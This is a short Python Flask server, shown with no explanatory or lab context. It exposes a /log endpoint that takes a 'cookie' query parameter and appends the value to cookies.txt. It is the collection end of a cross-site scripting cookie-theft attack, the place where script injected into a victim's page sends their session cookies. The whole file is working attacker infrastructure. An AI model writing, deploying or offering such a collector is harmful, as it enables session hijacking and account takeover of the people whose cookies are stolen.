from flask import Flask, request

app = Flask(__name__)

@app.route('/log', methods=['GET'])
def log_cookie():
    cookie = request.args.get('cookie')
    if cookie:
        with open('cookies.txt', 'a') as f:
            f.write(cookie + '\n')
        return 'Cookie logged successfully', 200
    return 'No cookie found', 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
